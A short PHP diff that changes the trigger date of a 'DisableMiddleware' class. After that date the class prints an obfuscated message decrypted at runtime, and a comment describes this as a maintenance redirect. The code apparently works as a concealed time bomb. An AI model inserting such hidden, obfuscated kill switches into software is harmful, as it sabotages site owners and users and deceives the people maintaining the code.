@@ -11,7 +11,7 @@ class DisableMiddleware {
 
     public function run()
     {
-        $disableDate = "2023-06-06";//YYYY-MM-DD
+        $disableDate = "2023-06-08";//YYYY-MM-DD
         // Middleware logic goes here
         if ($disableDate <= date('Y-m-d')) {
             echo $this->decrypt('NAYeRQoXCA1LEQtSHQgSRRAaCEkJBAgTAwoORRAdTQoECxAbAxwORREBBAcMRRAaCEkYHBcGCARFRS8bAw0HHEQRAgcfBAcGTRAEEBZSCQwdAAgdHQwZSw==','mikedr'); // Redirect to a maintenance page
